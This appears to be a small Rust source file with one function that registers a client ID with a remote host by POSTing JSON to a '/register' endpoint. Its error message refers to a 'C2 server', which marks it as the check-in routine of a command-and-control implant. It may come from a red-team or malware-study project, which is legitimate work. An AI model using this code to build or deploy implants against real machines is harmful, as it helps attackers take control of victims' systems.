use std::collections::HashMap;

extern crate reqwest;

pub fn register_client(host: &str, uid: &str) -> Result<(), Box<dyn std::error::Error>> {
    let uri = format!("{}/register", host);
    let mut obj = HashMap::new();
    obj.insert("uid", uid);

    let client = reqwest::blocking::Client::new();
    let res = client.post(uri).json(&obj).send();

    if res.is_ok() {
        println!("{}", res.unwrap().text().unwrap());
    } else {
        if res.unwrap_err().is_connect() {
            println!("No connection to C2 server.");
        } else {
            println!("Unknown error.");
        }
    }
    return Ok(());
}
